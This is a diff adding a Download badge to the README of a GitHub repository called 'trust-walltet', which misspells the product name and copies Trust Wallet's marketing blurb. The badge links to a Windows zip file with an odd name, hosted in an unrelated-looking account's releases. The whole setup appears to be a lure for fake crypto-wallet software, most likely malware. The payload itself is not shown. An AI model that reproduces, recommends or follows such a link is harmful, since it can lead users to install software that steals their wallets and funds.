@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/Download-Windows%20x64-0078D6?style=for-the-badge&logo=windows)](https://github.com/mike-brown-hq1994r5/trust-walltet/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # trust-walltet
 
 Trust-walltet — > Trust Wallet is a secure multi-chain self-custody wallet and your gateway to 10+ million digital assets, NFTs, and thousands of Web3 dApps. It allows users to store, send, receive, and manage digital assets.
